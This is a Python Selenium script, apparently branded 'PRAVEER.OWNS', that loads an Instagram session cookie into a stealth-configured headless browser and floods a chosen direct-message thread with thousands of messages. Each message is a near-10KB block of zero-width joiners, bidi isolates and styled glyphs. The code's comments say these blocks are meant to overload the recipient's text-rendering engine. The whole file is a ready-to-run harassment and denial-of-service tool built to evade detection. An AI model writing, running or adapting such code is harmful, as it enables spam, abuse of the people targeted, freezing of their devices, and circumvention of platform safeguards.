# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (PAPA-TOP V31)
# 📅 STATUS: MEMORY-POOL-SATURATION | 4-AGENT TOTAL | AWS-KILLER

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.1)   
SESSION_LIMIT = 180       
REST_AFTER_STRIKES = 200    
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_papa_top_payload():
    """Generates the 'Praveer Papa' heavy rendering block."""
    u_id = random.randint(1000, 9999)
    # \u200D = Zero Width Joiner (ZWJ)
    # \u2068 = Isolate
    zwj, glue, iso, pop = "\u200D", "\u2060", "\u2068", "\u2069"
    
    # 👑 THE BRANDED HEADER
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [REF:{u_id}]"
    
    body = []
    # Maximum density lines to fill the 10kb limit
    for i in range(350):
        # We bond the '🌙' emoji to standard text using ZWJ. 
        # This forces the HarfBuzz engine to look for a multi-glyph ligature that doesn't exist.
        line = f"{iso}𝕻{zwj}𝚁{zwj}𝕬{zwj}𝚅{zwj}𝕰{zwj}𝕰{zwj}𝕽{zwj}🌙{i}{pop}{glue}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    machine = os.environ.get('MACHINE_ID', '1')
    print(f"[{timestamp}] M-{machine} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu") # Force CPU to handle text-shaping math
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"praveer_node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_send(driver, text):
    try:
        box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
        driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, text)
        time.sleep(0.1)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        strike_counter = 0
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            if adaptive_send(driver, "🚀 PRAVEER PAPA MATRIX INITIALIZED"):
                while (time.time() - global_start) < TOTAL_DURATION:
                    payload = get_papa_top_payload()
                    if adaptive_send(driver, payload):
                        strike_counter += 1
                        with COUNTER_LOCK:
                            global GLOBAL_SENT
                            GLOBAL_SENT += 1
                        
                        if strike_counter % REST_AFTER_STRIKES == 0:
                            log_status(agent_id, "✅ Burst Complete. Resting.")
                            time.sleep(REST_DURATION)
                        else:
                            log_status(agent_id, f"Delivered ({GLOBAL_SENT})")
                    time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
